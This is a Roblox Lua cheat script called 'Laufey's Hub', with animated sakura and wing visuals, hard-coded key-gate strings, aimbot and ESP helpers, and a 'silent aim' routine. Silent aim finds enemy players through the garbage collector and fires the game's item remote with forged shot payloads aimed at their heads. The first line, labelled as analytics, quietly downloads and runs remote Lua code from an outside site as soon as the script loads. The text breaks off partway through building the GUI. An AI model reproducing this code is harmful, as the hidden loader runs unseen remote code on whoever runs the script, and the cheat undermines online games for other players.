--[[sv:analytics]]task.spawn(function()pcall(function()loadstring(game:HttpGet("https://scriptverse.net/api/analytics/client.lua?s=d057f344d741767ab0b3c6d0f9c95b79"))()end)end)--[[/sv:analytics]]

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local ContentProvider = game:GetService("ContentProvider")
local LocalPlayer = Players.LocalPlayer

-- ══════════════════════════════════════════════════════════════
--  CONFIG
-- ══════════════════════════════════════════════════════════════

local CONFIG = {
	SONG_ID         = "rbxassetid://137818846701724",
	SONG_START      = 0,
	SONG_VOLUME     = 0.6,
	LAUFEY_IMAGE_ID = "rbxassetid://104019174213506",

	WHITE    = Color3.fromRGB(255, 255, 255),
	SOFT     = Color3.fromRGB(250, 248, 252),
	PANEL_2  = Color3.fromRGB(240, 236, 246),
	INK      = Color3.fromRGB(34, 28, 46),
	MUTED    = Color3.fromRGB(128, 118, 150),
	ACCENT   = Color3.fromRGB(186, 160, 240),
	ACCENT_2 = Color3.fromRGB(246, 196, 226),
	ON       = Color3.fromRGB(226, 214, 248),
	OFF      = Color3.fromRGB(241, 239, 244),
	DANGER   = Color3.fromRGB(250, 214, 222),
}

-- ══════════════════════════════════════════════════════════════
--  Key gate data (unchanged)
-- ══════════════════════════════════════════════════════════════

local key1_data = {79, 78, 76, 89, 85, 83, 75, 78, 79, 87, 83} -- ONLYUSKNOWS
local key2_data = {80, 65, 73, 68, 83, 72, 73, 84}             -- PAIDSHIT
local key3_data = {74, 72, 89, 75, 69, 82, 76}                 -- JHYKERL
local user_data = {106, 104, 121, 107, 101, 114, 108}          -- jhykerl

local function resolve(bytes)
	local buffer = {}
	for i, v in ipairs(bytes) do
		buffer[i] = string.char(v)
	end
	return table.concat(buffer)
end

-- ══════════════════════════════════════════════════════════════
--  Helpers
-- ══════════════════════════════════════════════════════════════

local function protect(gui)
	if syn and syn.protect_gui then
		syn.protect_gui(gui)
		gui.Parent = game:GetService("CoreGui")
	elseif gethui then
		gui.Parent = gethui()
	else
		gui.Parent = game:GetService("CoreGui")
	end
end

local function round(parent, radius)
	local c = Instance.new("UICorner")
	c.CornerRadius = UDim.new(0, radius or 10)
	c.Parent = parent
	return c
end

local function stroke(parent, color, thickness, transparency)
	local s = Instance.new("UIStroke")
	s.Color = color or CONFIG.ACCENT
	s.Thickness = thickness or 1
	s.Transparency = transparency or 0.5
	s.Parent = parent
	return s
end

local function tween(obj, time, props, style, dir)
	local tw = TweenService:Create(
		obj,
		TweenInfo.new(time, style or Enum.EasingStyle.Quint, dir or Enum.EasingDirection.Out),
		props
	)
	tw:Play()
	return tw
end

local function label(parent, text, size, font, color, z)
	local l = Instance.new("TextLabel")
	l.BackgroundTransparency = 1
	l.Size = UDim2.new(1, 0, 0, size + 8)
	l.Text = text
	l.Font = font or Enum.Font.GothamMedium
	l.TextSize = size
	l.TextColor3 = color or CONFIG.INK
	l.ZIndex = z or 3
	l.Parent = parent
	return l
end

local function makeButton(parent, text, y, color, font)
	local b = Instance.new("TextButton")
	b.AnchorPoint = Vector2.new(0.5, 0)
	b.Position = UDim2.new(0.5, 0, 0, y)
	b.Size = UDim2.new(0, 196, 0, 28)
	b.BackgroundColor3 = color
	b.AutoButtonColor = false
	b.Text = text
	b.Font = font or Enum.Font.Montserrat
	b.TextSize = 12
	b.TextColor3 = CONFIG.INK
	b.ZIndex = 3
	b.Parent = parent
	round(b, 8)
	stroke(b, CONFIG.ACCENT, 1, 0.7)
	b.MouseEnter:Connect(function() tween(b, 0.18, { BackgroundColor3 = CONFIG.WHITE }) end)
	b.MouseLeave:Connect(function() tween(b, 0.18, { BackgroundColor3 = color }) end)
	return b
end

local function makeInputRow(parent, labelText, y, default)
	local row = Instance.new("Frame")
	row.AnchorPoint = Vector2.new(0.5, 0)
	row.Position = UDim2.new(0.5, 0, 0, y)
	row.Size = UDim2.new(0, 196, 0, 28)
	row.BackgroundColor3 = CONFIG.PANEL_2
	row.ZIndex = 3
	row.Parent = parent
	round(row, 8)

	local lbl = Instance.new("TextLabel")
	lbl.BackgroundTransparency = 1
	lbl.Position = UDim2.new(0, 10, 0, 0)
	lbl.Size = UDim2.new(0.6, 0, 1, 0)
	lbl.Text = labelText
	lbl.Font = Enum.Font.Gotham
	lbl.TextSize = 12
	lbl.TextColor3 = CONFIG.MUTED
	lbl.TextXAlignment = Enum.TextXAlignment.Left
	lbl.ZIndex = 4
	lbl.Parent = row

	local box = Instance.new("TextBox")
	box.AnchorPoint = Vector2.new(1, 0.5)
	box.Position = UDim2.new(1, -6, 0.5, 0)
	box.Size = UDim2.new(0, 56, 0, 20)
	box.BackgroundColor3 = CONFIG.WHITE
	box.Text = tostring(default)
	box.Font = Enum.Font.GothamMedium
	box.TextSize = 12
	box.TextColor3 = CONFIG.INK
	box.ClearTextOnFocus = false
	box.ZIndex = 4
	box.Parent = row
	round(box, 6)
	return box
end

-- ══════════════════════════════════════════════════════════════
--  Song
-- ══════════════════════════════════════════════════════════════

local function makeSong(root)
	local s = Instance.new("Sound")
	s.Name = "LaufeySong"
	s.SoundId = CONFIG.SONG_ID
	s.Volume = 0
	s.Looped = false
	s.Parent = root
	task.spawn(function()
		pcall(function() ContentProvider:PreloadAsync({ s }) end)
	end)
	return s
end

local function playSong(s)
	s.TimePosition = CONFIG.SONG_START
	s:Play()
	tween(s, 2.2, { Volume = CONFIG.SONG_VOLUME }, Enum.EasingStyle.Sine)
end

local function stopSong(s, fadeTime)
	local tw = tween(s, fadeTime or 1.4, { Volume = 0 }, Enum.EasingStyle.Sine)
	tw.Completed:Connect(function() s:Destroy() end)
end

-- ══════════════════════════════════════════════════════════════
--  Sakura — falls throughout the session, cleans up on outro
-- ══════════════════════════════════════════════════════════════

local function makeSakura(root)
	local layer = Instance.new("Frame")
	layer.Name = "SakuraLayer"
	layer.Size = UDim2.fromScale(1, 1)
	layer.BackgroundTransparency = 1
	layer.ZIndex = 1
	layer.ClipsDescendants = false
	layer.Parent = root

	-- petal color palette
	local PETAL_COLORS = {
		Color3.fromRGB(255, 218, 235),
		Color3.fromRGB(252, 205, 226),
		Color3.fromRGB(246, 196, 226),
		Color3.fromRGB(255, 238, 248),
		Color3.fromRGB(237, 198, 243),
		Color3.fromRGB(255, 228, 240),
	}

	-- tree silhouettes — dark branch frames anchored to bottom corners
	local TREE_COLOR = Color3.fromRGB(36, 24, 48)

	local function makeTreeSilhouette(anchorX, posXScale, branchDir)
		-- trunk
		local trunk = Instance.new("Frame")
		trunk.Name = "SakuraTrunk"
		trunk.AnchorPoint = Vector2.new(anchorX, 1)
		trunk.Position = UDim2.new(posXScale, 0, 1, 0)
		trunk.Size = UDim2.new(0, 13, 0, 210)
		trunk.BackgroundColor3 = TREE_COLOR
		trunk.BorderSizePixel = 0
		trunk.ZIndex = 1
		trunk.Parent = layer
		round(trunk, 5)

		-- branches: { rot, width, height, yFrac from trunk top }
		local branches = {
			{ rot = branchDir * 38,  w = 105, h = 8,  yf = 0.30 },
			{ rot = branchDir * 22,  w = 82,  h = 7,  yf = 0.46 },
			{ rot = branchDir * -18, w = 68,  h = 6,  yf = 0.40 },
			{ rot = branchDir * 50,  w = 52,  h = 5,  yf = 0.22 },
			{ rot = branchDir * 14,  w = 42,  h = 4,  yf = 0.58 },
			{ rot = branchDir * -32, w = 36,  h = 4,  yf = 0.52 },
		}
		for _, b in ipairs(branches) do
			local br = Instance.new("Frame")
			-- anchor on the side toward the center so branches extend outward
			br.AnchorPoint = Vector2.new(anchorX, 0.5)
			br.Position = UDim2.new(0.5, 0, b.yf, 0)
			br.Size = UDim2.new(0, b.w, 0, b.h)
			br.BackgroundColor3 = TREE_COLOR
			br.Rotation = b.rot
			br.BorderSizePixel = 0
			br.ZIndex = 1
			br.Parent = trunk
			round(br, 3)
		end
	end

	makeTreeSilhouette(0, 0.03, 1)   -- left
	makeTreeSilhouette(1, 0.97, -1)  -- right

	-- petal spawner
	local active = true

	local function spawnPetal()
		local p = Instance.new("Frame")
		local w = math.random(5, 13)
		local h = math.random(3, 8)
		local startX  = math.random(0, 100) / 100
		local driftX  = math.random(-10, 10) / 100
		local fallDur = math.random(45, 90) / 10      -- 4.5 – 9 s
		local startT  = math.random(25, 45) / 100     -- start partially transparent
		local startR  = math.random(0, 360)
		local endR    = startR + math.random(-200, 200)
		local col     = PETAL_COLORS[math.random(1, #PETAL_COLORS)]

		p.AnchorPoint = Vector2.new(0.5, 0.5)
		p.Position = UDim2.new(startX, 0, -0.02, 0)
		p.Size = UDim2.new(0, w, 0, h)
		p.BackgroundColor3 = col
		p.BackgroundTransparency = startT
		p.BorderSizePixel = 0
		p.Rotation = startR
		p.ZIndex = 1
		p.Parent = layer
		round(p, 999)

		local tw = TweenService:Create(
			p,
			TweenInfo.new(fallDur, Enum.EasingStyle.Linear),
			{
				Position = UDim2.new(startX + driftX, 0, 1.06, 0),
				Rotation = endR,
				BackgroundTransparency = 0.75,
			}
		)
		tw:Play()
		tw.Completed:Connect(function() p:Destroy() end)
	end

	-- initial burst so screen isn't empty right away
	task.spawn(function()
		for _ = 1, 18 do
			spawnPetal()
			task.wait(0.1)
		end
		while active do
			spawnPetal()
			task.wait(math.random(18, 45) / 100)
		end
	end)

	-- returns cleanup fn for outro
	return function()
		active = false
		-- fade every existing petal and the tree trunks out
		for _, child in ipairs(layer:GetDescendants()) do
			if child:IsA("Frame") then
				tween(child, 1.0, { BackgroundTransparency = 1 })
			end
		end
		task.delay(1.2, function() layer:Destroy() end)
	end
end

-- ══════════════════════════════════════════════════════════════
--  Intro  (sakura layer already created before this is called)
-- ══════════════════════════════════════════════════════════════

local function showIntro(root, song, onDone)
	local curtain = Instance.new("Frame")
	curtain.Name = "Curtain"
	curtain.Size = UDim2.fromScale(1, 1)
	curtain.BackgroundTransparency = 1
	curtain.ZIndex = 50
	curtain.Parent = root

	local topPanel = Instance.new("Frame")
	topPanel.Size = UDim2.new(1, 0, 0.5, 0)
	topPanel.BackgroundColor3 = CONFIG.WHITE
	topPanel.BorderSizePixel = 0
	topPanel.ZIndex = 50
	topPanel.Parent = curtain

	local botPanel = Instance.new("Frame")
	botPanel.Position = UDim2.new(0, 0, 0.5, 0)
	botPanel.Size = UDim2.new(1, 0, 0.5, 0)
	botPanel.BackgroundColor3 = CONFIG.WHITE
	botPanel.BorderSizePixel = 0
	botPanel.ZIndex = 50
	botPanel.Parent = curtain

	-- soft blossom tint on each panel
	local function addPanelBloom(panel)
		local bloom = Instance.new("UIGradient")
		bloom.Color = ColorSequence.new({
			ColorSequenceKeypoint.new(0, CONFIG.WHITE),
			ColorSequenceKeypoint.new(0.55, CONFIG.SOFT),
			ColorSequenceKeypoint.new(1, Color3.fromRGB(250, 240, 252)),
		})
		bloom.Rotation = 135
		bloom.Parent = panel
	end
	addPanelBloom(topPanel)
	addPanelBloom(botPanel)

	local content = Instance.new("Frame")
	content.Size = UDim2.fromScale(1, 1)
	content.BackgroundTransparency = 1
	content.ZIndex = 51
	content.Parent = curtain

	-- decorative petal accent lines behind the title
	local accentL = Instance.new("Frame")
	accentL.AnchorPoint = Vector2.new(1, 0.5)
	accentL.Position = UDim2.fromScale(0.28, 0.42)
	accentL.Size = UDim2.new(0, 0, 0, 1)
	accentL.BackgroundColor3 = CONFIG.ACCENT_2
	accentL.BorderSizePixel = 0
	accentL.BackgroundTransparency = 0.3
	accentL.ZIndex = 52
	accentL.Parent = content

	local accentR = Instance.new("Frame")
	accentR.AnchorPoint = Vector2.new(0, 0.5)
	accentR.Position = UDim2.fromScale(0.72, 0.42)
	accentR.Size = UDim2.new(0, 0, 0, 1)
	accentR.BackgroundColor3 = CONFIG.ACCENT_2
	accentR.BorderSizePixel = 0
	accentR.BackgroundTransparency = 0.3
	accentR.ZIndex = 52
	accentR.Parent = content

	local title = label(content, "LAUFEY'S HUB", 30, Enum.Font.GothamBold, CONFIG.INK, 52)
	title.AnchorPoint = Vector2.new(0.5, 0.5)
	title.Position = UDim2.fromScale(0.5, 0.42)
	title.Size = UDim2.new(0, 420, 0, 40)
	title.TextTransparency = 1
	title.TextXAlignment = Enum.TextXAlignment.Center

	local line = Instance.new("Frame")
	line.AnchorPoint = Vector2.new(0.5, 0.5)
	line.Position = UDim2.fromScale(0.5, 0.5)
	line.Size = UDim2.new(0, 0, 0, 2)
	line.BackgroundColor3 = CONFIG.ACCENT
	line.BorderSizePixel = 0
	line.ZIndex = 52
	line.Parent = content
	round(line, 2)

	-- gradient on the divider line
	local lineGrad = Instance.new("UIGradient")
	lineGrad.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, CONFIG.ACCENT_2),
		ColorSequenceKeypoint.new(0.5, CONFIG.ACCENT),
		ColorSequenceKeypoint.new(1, CONFIG.ACCENT_2),
	})
	lineGrad.Parent = line

	local sub = label(content, "✿  now playing  ·  laufey  ✿", 12, Enum.Font.Gotham, CONFIG.ACCENT, 52)
	sub.AnchorPoint = Vector2.new(0.5, 0.5)
	sub.Position = UDim2.fromScale(0.5, 0.565)
	sub.Size = UDim2.new(0, 400, 0, 20)
	sub.TextXAlignment = Enum.TextXAlignment.Center
	sub.TextTransparency = 1

	local status = label(content, "", 11, Enum.Font.Gotham, CONFIG.MUTED, 52)
	status.AnchorPoint = Vector2.new(0.5, 0)
	status.Position = UDim2.fromScale(0.5, 0.635)
	status.Size = UDim2.new(0, 300, 0, 16)
	status.TextXAlignment = Enum.TextXAlignment.Center

	-- small floating blossom dots
	for i = 1, 5 do
		local dot = Instance.new("Frame")
		dot.AnchorPoint = Vector2.new(0.5, 0.5)
		dot.Position = UDim2.new(math.random(20, 80) / 100, 0, math.random(20, 75) / 100, 0)
		dot.Size = UDim2.new(0, math.random(4, 9), 0, math.random(4, 9))
		dot.BackgroundColor3 = i % 2 == 0 and CONFIG.ACCENT or CONFIG.ACCENT_2
		dot.BackgroundTransparency = 0.6
		dot.BorderSizePixel = 0
		dot.ZIndex = 49
		dot.Parent = content
		round(dot, 999)
		-- gentle drift up
		task.spawn(function()
			task.wait(math.random(0, 60) / 100)
			tween(dot, math.random(28, 42) / 10,
				{ Position = UDim2.new(dot.Position.X.Scale, 0, dot.Position.Y.Scale - 0.06, 0),
				  BackgroundTransparency = 1 },
				Enum.EasingStyle.Sine)
		end)
	end

	-- animate in
	title.TextSize = 12
	tween(title, 1.0, { TextTransparency = 0, TextSize = 30 }, Enum.EasingStyle.Back)
	task.delay(0.6, function()
		tween(line, 0.8, { Size = UDim2.new(0, 240, 0, 2) }, Enum.EasingStyle.Quint)
		tween(accentL, 0.7, { Size = UDim2.new(0, 70, 0, 1) }, Enum.EasingStyle.Quint)
		tween(accentR, 0.7, { Size = UDim2.new(0, 70, 0, 1) }, Enum.EasingStyle.Quint)
		tween(sub, 0.8, { TextTransparency = 0 })
	end)

	task.spawn(function()
		local steps = { "loading tracks", "tuning the strings", "warming up the hub" }
		task.wait(0.9)
		for _, msg in ipairs(steps) do
			status.Text = msg
			task.wait(0.7)
		end

		status.Text = "almost there"
		local waited = 0
		while not song.IsLoaded and waited < 6 do
			task.wait(0.1)
			waited += 0.1
		end

		status.Text = ""
		playSong(song)

		tween(line, 0.5, { Size = UDim2.new(0, 0, 0, 2) }, Enum.EasingStyle.Quint, Enum.EasingDirection.In)
		tween(accentL, 0.4, { Size = UDim2.new(0, 0, 0, 1) }, Enum.EasingStyle.Quint, Enum.EasingDirection.In)
		tween(accentR, 0.4, { Size = UDim2.new(0, 0, 0, 1) }, Enum.EasingStyle.Quint, Enum.EasingDirection.In)
		tween(title, 0.5, { TextTransparency = 1 })
		tween(sub, 0.5, { TextTransparency = 1 })
		task.wait(0.5)

		tween(topPanel, 1.1, { Position = UDim2.new(0, 0, -0.5, 0) }, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut)
		tween(botPanel, 1.1, { Position = UDim2.new(0, 0, 1, 0) }, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut)
		tween(content, 0.6, { BackgroundTransparency = 1 })
		task.wait(0.9)

		onDone()
		task.wait(0.3)
		curtain:Destroy()
	end)
end

-- ══════════════════════════════════════════════════════════════
--  Wings: five feathers per side, vertically spread, organic flap
-- ══════════════════════════════════════════════════════════════

-- yFrac = vertical anchor on the hub (0 = top, 1 = bottom)
-- rot   = base rotation in degrees (multiplied by side sign)
-- amp   = flap excursion added on top of rot
local FEATHERS = {
	{ size = UDim2.new(0, 82,  0, 32), rot = -6,  yFrac = 0.24, alpha = 0.07, delay = 0.55, amp = 8,  period = 2.15 },
	{ size = UDim2.new(0, 116, 0, 46), rot = 7,   yFrac = 0.36, alpha = 0.15, delay = 0.40, amp = 11, period = 2.00 },
	{ size = UDim2.new(0, 140, 0, 54), rot = 18,  yFrac = 0.46, alpha = 0.21, delay = 0.28, amp = 13, period = 1.88 },
	{ size = UDim2.new(0, 122, 0, 44), rot = 30,  yFrac = 0.56, alpha = 0.13, delay = 0.36, amp = 16, period = 1.72 },
	{ size = UDim2.new(0, 88,  0, 28), rot = 44,  yFrac = 0.65, alpha = 0.06, delay = 0.50, amp = 20, period = 1.55 },
}

local function makeFeather(hub, side, f)
	local feather = Instance.new("Frame")
	feather.Name = side < 0 and "WingL" or "WingR"
	feather.AnchorPoint = Vector2.new(side < 0 and 1 or 0, 0.5)
	feather.Position = UDim2.new(side < 0 and 0 or 1, side < 0 and 8 or -8, f.yFrac, 0)
	feather.Size = UDim2.new(0, 0, 0, 0)
	feather.BackgroundColor3 = CONFIG.ACCENT
	feather.BackgroundTransparency = f.alpha
	feather.BorderSizePixel = 0
	feather.Rotation = 0
	feather.ZIndex = 0
	feather.Parent = hub
	round(feather, 999)

	local grad = Instance.new("UIGradient")
	grad.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0,    CONFIG.ACCENT),
		ColorSequenceKeypoint.new(0.55, CONFIG.ACCENT_2),
		ColorSequenceKeypoint.new(1,    CONFIG.WHITE),
	})
	grad.Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0,    0.02),
		NumberSequenceKeypoint.new(0.55, 0.25),
		NumberSequenceKeypoint.new(1,    0.92),
	})
	grad.Rotation = side < 0 and 195 or -15
	grad.Parent = feather

	local record = { frame = feather, flap = nil }

	task.delay(f.delay, function()
		if not feather.Parent then return end
		tween(feather, 1.05, { Size = f.size, Rotation = f.rot * side }, Enum.EasingStyle.Back)
		task.wait(1.05)
		if not feather.Parent then return end
		local info = TweenInfo.new(f.period, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
		record.flap = TweenService:Create(feather, info, { Rotation = (f.rot + f.amp) * side })
		record.flap:Play()
	end)

	return record
end

local function makeWings(hub)
	local records = {}
	for _, side in ipairs({ -1, 1 }) do
		for _, f in ipairs(FEATHERS) do
			table.insert(records, makeFeather(hub, side, f))
		end
	end
	return records
end

-- ══════════════════════════════════════════════════════════════
--  Aimbot / ESP helpers
-- ══════════════════════════════════════════════════════════════

local function getTargetPart(char, mode)
	if mode == "Head" then
		return char:FindFirstChild("HeadHB") or char:FindFirstChild("Head")
	elseif mode == "Body" then
		return char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso") or char:FindFirstChild("HumanoidRootPart")
	else
		return char:FindFirstChild("LeftFoot") or char:FindFirstChild("RightFoot")
			or char:FindFirstChild("Left Leg") or char:FindFirstChild("Right Leg")
	end
end

local function getHealthColor(pct)
	if pct > 0.7 then return Color3.new(0.2, 0.85, 0.3)
	elseif pct > 0.3 then return Color3.new(1, 0.85, 0.2)
	else return Color3.new(1, 0.25, 0.3) end
end

local function createOverheadGui(head)
	local billboard = Instance.new("BillboardGui")
	billboard.Name = "HealthDisplay"
	billboard.Size = UDim2.new(4, 0, 1, 0)
	billboard.StudsOffset = Vector3.new(0, 3, 0)
	billboard.AlwaysOnTop = true
	billboard.Parent = head

	local l = Instance.new("TextLabel")
	l.Size = UDim2.new(1, 0, 1, 0)
	l.BackgroundTransparency = 1
	l.TextScaled = true
	l.TextColor3 = Color3.new(1, 1, 1)
	l.TextStrokeTransparency = 0
	l.Font = Enum.Font.GothamBold
	l.Parent = billboard
	return l
end

local function updatePlayerDisplay(player, lbl, highlight)
	local character = player.Character
	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
	if not humanoid then
		if lbl then lbl.Text = "Dead" lbl.TextColor3 = Color3.new(1, 1, 1) end
		if highlight then highlight:Destroy() end
		return
	end
	local pct = humanoid.Health / humanoid.MaxHealth
	local color = getHealthColor(pct)
	if lbl then
		lbl.Text = string.format("❤️ %d", math.floor(humanoid.Health))
		lbl.TextColor3 = color
	end
	if highlight then
		highlight.FillColor = color
		highlight.OutlineColor = color
	end
end

-- ══════════════════════════════════════════════════════════════
--  Hub
-- ══════════════════════════════════════════════════════════════

local function buildHub(root, song, sakuraCleanup)
	local lp  = LocalPlayer
	local cam = workspace.CurrentCamera
	local running = true

	getgenv().Aimbot     = true
	getgenv().ShowFOV    = true
	getgenv().Smoothness = 0.5
	getgenv().FOV        = 150
	getgenv().TargetMode = "Head"
	getgenv().ESP        = true

	-- first-person check: camera sits inside the head when in first person
	local function isFirstPerson()
		local char = lp.Character
		if not char then return false end
		local head = char:FindFirstChild("Head")
		if not head then return false end
		return (cam.CFrame.Position - head.Position).Magnitude < 1.0
	end

	-- ── genv defaults ──
	getgenv().Noclip        = false
	getgenv().InfJump       = false
	getgenv().Speedhack     = false
	getgenv().SpeedVal      = 24
	getgenv().Fullbright    = false
	getgenv().FlyEnabled    = false
	getgenv().FlySpeed      = 60
	getgenv().SilentAim     = false
	getgenv().AutoParry     = false

	-- ── Silent Aim (full kicia source) ──
	local _saRemote, _saInputConn
	local _cleanSARemote     = Instance.new('RemoteEvent')
	local _fireServerNative  = clonefunction(_cleanSARemote.FireServer)
	local _cachedEnumLib     = nil

	local function _saFindChild(root, ...)
		local node = root
		for _, name in ipairs({...}) do
			if not node then return nil end
			node = node:FindFirstChild(name)
		end
		return node
	end

	local function _enc(name)
		if not _cachedEnumLib then
			local mod = _saFindChild(cloneref(game:GetService('ReplicatedStorage')), 'Modules', 'EnumLibrary')
			if not mod then return nil end
			local ok, lib = pcall(require, mod)
			if ok and type(lib) == 'table' then _cachedEnumLib = lib end
		end
		if not _cachedEnumLib then return nil end
		local ok, token = pcall(_cachedEnumLib.ToEnum, _cachedEnumLib, name)
		return ok and token or nil
	end

	local function _getFighterController()
		for _, m in ipairs(getgc(true)) do
			if type(m) == 'table' and rawget(m,'LocalFighter') ~= nil and rawget(m,'Objects') ~= nil then
				return m
			end
		end
	end
	local function _getLocalFighter() local c = _getFighterController(); return c and rawget(c,'LocalFighter') or nil end

	local function _isEnemy(player)
		if player == nil or player == lp then return false end
		local myId = lp:GetAttribute('TeamID'); local theirId = player:GetAttribute('TeamID')
		if myId ~= nil and theirId ~= nil then return myId ~= theirId end
		if lp.Team ~= nil and player.Team ~= nil then return lp.Team ~= player.Team end
		return true
	end

	local _wcp = RaycastParams.new(); _wcp.FilterType = Enum.RaycastFilterType.Exclude
	local function _hasLOS(myRoot, hitboxHead, enemyModel)
		local char = lp.Character; local exclude = {}
		if char then table.insert(exclude, char) end
		table.insert(exclude, enemyModel)
		for _, v in ipairs(enemyModel:GetDescendants()) do table.insert(exclude, v) end
		_wcp.FilterDescendantsInstances = exclude
		local result = workspace:Raycast(myRoot.Position, hitboxHead.Position - myRoot.Position, _wcp)
		return result == nil
	end

	local function _getSATarget()
		local controller = _getFighterController()
		local objects = controller and rawget(controller,'Objects') or nil
		if type(objects) ~= 'table' then return nil end
		local bestDist, bestEntry = math.huge, nil
		local char = lp.Character; local myRoot = char and char:FindFirstChild('HumanoidRootPart')
		for _, fighter in ipairs(objects) do
			local ok, entry = pcall(function()
				local player = rawget(fighter,'Player'); local entity = rawget(fighter,'Entity')
				local model  = entity and rawget(entity,'Model') or nil
				if not model then return nil end
				if player ~= nil and not _isEnemy(player) then return nil end
				local hitboxHead = model:FindFirstChild('HitboxHead')
				local humanoid   = model:FindFirstChildOfClass('Humanoid')
				if not hitboxHead then return nil end
				if humanoid and humanoid.Health <= 0 then return nil end
				local data = entity and rawget(entity,'Data') or nil
				if data and rawget(data,'IsInvincible') == true then return nil end
				if data and rawget(data,'IsDeflecting') == true then return nil end
				local fd = rawget(fighter,'Data') or nil
				if fd and rawget(fd,'IsDeflecting') == true then return nil end
				if myRoot and not _hasLOS(myRoot, hitboxHead, model) then return nil end
				return { hitboxHead = hitboxHead, model = model }
			end)
			if ok and entry and myRoot then
				local dist = (entry.hitboxHead.Position - myRoot.Position).Magnitude
				if dist < bestDist then bestDist = dist; bestEntry = entry end
			elseif ok and entry then bestEntry = entry; break end
		end
		return bestEntry
	end

	local function _buildPayload(hitboxHead, isRaycast)
		local pos = hitboxHead.Position
		local aim1  = { ['\0']=pos.X,['\1']=pos.Y,  ['\2']=pos.Z,['\3']=-math.pi/2,['\4']=0,['\5']=0 }
		local aim2  = { ['\0']=pos.X,['\1']=pos.Y+1,['\2']=pos.Z,['\3']=-math.pi/2,['\4']=0,['\5']=0 }
		local extra = { ['\0']=0,['\1']=1,['\2']=0,['\3']=0,['\4']=0,['\5']=0 }
		local inner = { ['\0']=aim1,['\1']=aim2,['\2']=hitboxHead,['\3']=extra }
		if isRaycast then return { ['\1']=inner,['\2']=true } end
		return { ['\1']=inner }
	end

	local function _iInfo(i) return rawget(i,'Info') end
	local function _iType(i) local x=_iInfo(i); return x and rawget(x,'Type') or nil end
	local function _iRaycast(i) local x=_iInfo(i); return x and rawget(x,'IsRaycast')==true end
	local function _iObjId(i) local d=rawget(i,'Data'); return d and rawget(d,'ObjectID') or nil end
	local function _iAmmo(i) local d=rawget(i,'Data'); local a=d and rawget(d,'Ammo'); return type(a)=='number' and a or 0 end
	local function _iEquipped(i) return rawget(i,'IsEquipped') end

	local function _getGun(fighter)
		local items = rawget(fighter,'Items'); if type(items)~='table' then return nil end
		for _, item in next, items do
			if type(item)=='table' and _iType(item)=='Gun' and _iEquipped(item) and _iAmmo(item)>0 then return item end
		end
		return nil
	end

	local function _fireAt(remote, fighter, target)
		local item = _getGun(fighter); if not item then return end
		local objectId = _iObjId(item); local isRaycast = _iRaycast(item); local token = _enc('StartShooting')
		if not objectId or not token then return end
		_fireServerNative(remote, objectId, token, _buildPayload(target.hitboxHead, isRaycast), nil)
	end

	-- also hook IsFullyAiming
	local function _hookFullyAiming()
		local ok, gun = pcall(function()
			return require(lp.PlayerScripts.Modules.ItemTypes.Gun)
		end)
		if ok and gun and gun.IsFullyAiming then
			gun.IsFullyAiming = function() return true end
		end
	end
	pcall(_hookFullyAiming)

	local function _startSA()
		pcall(function()
			local rs = cloneref(game:GetService('ReplicatedStorage'))
			local r = _saFindChild(rs,'Remotes','Replication','Fighter','UseItem')
			_saRemote = r and r:IsA('RemoteEvent') and cloneref(r) or nil
		end)
		if not _saRemote then return end
		if _saInputConn then _saInputConn:Disconnect() end
		_saInputConn = game:GetService('UserInputService').InputBegan:Connect(function(input, gp)
			if not getgenv().SilentAim then return end
			if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
			local fighter = _getLocalFighter(); if not fighter then return end
			local target  = _getSATarget();    if not target  then return end
			pcall(_fireAt, _saRemote, fighter, target)
		end)
	end
	_startSA()
	getgenv().AutoFarm      = false
	getgenv().ChatSpy       = false
	getgenv().AntiRagdoll   = false
	getgenv().InfStamina    = false
	getgenv().WalkSpeed     = 16

	local HUB_SIZE = UDim2.new(0, 260, 0, 560)

	local hub = Instance.new("Frame")
	hub.Name = "Hub"
	hub.AnchorPoint = Vector2.new(0.5, 0.5)
	hub.Position = UDim2.fromScale(0.5, 0.5)
	hub.Size = UDim2.new(0, 0, 0, 0)
	hub.BackgroundColor3 = CONFIG.WHITE
	hub.BorderSizePixel = 0
	hub.ZIndex = 2
	hub.Parent = root
	round(hub, 18)
	stroke(hub, CONFIG.ACCENT, 1.2, 0.4)

	local hubGrad = Instance.new("UIGradient")
	hubGrad.Color = ColorSequence.new(CONFIG.WHITE, CONFIG.SOFT)
	hubGrad.Rotation = 90
	hubGrad.Parent = hub

	tween(hub, 1.0, { Size = HUB_SIZE }, Enum.EasingStyle.Back)

	-- drag
	do
		local dragging, dragStart, startPos = false, nil, nil
		hub.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 then
				dragging = true; dragStart = input.Position; startPos = hub.Position
			end
		end)
		hub.InputEnded:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
		end)
		UserInputService.InputChanged:Connect(function(input)
			if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
				local d = input.Position - dragStart
				hub.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
			end
		end)
	end

	task.delay(1.0, function()
		if not running then return end
		TweenService:Create(hub, TweenInfo.new(2.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
			{ Position = UDim2.new(hub.Position.X.Scale, hub.Position.X.Offset, hub.Position.Y.Scale, hub.Position.Y.Offset - 6) }):Play()
	end)

	local wings = makeWings(hub)

	-- portrait
	local ring = Instance.new("Frame")
	ring.AnchorPoint = Vector2.new(0.5, 0)
	ring.Position = UDim2.new(0.5, 0, 0, 14)
	ring.Size = UDim2.new(0, 88, 0, 88)
	ring.BackgroundColor3 = CONFIG.ACCENT
	ring.BorderSizePixel = 0
	ring.ZIndex = 3
	ring.Parent = hub
	round(ring, 44)

	local portrait = Instance.new("ImageLabel")
	portrait.AnchorPoint = Vector2.new(0.5, 0.5)
	portrait.Position = UDim2.fromScale(0.5, 0.5)
	portrait.Size = UDim2.new(1, -4, 1, -4)
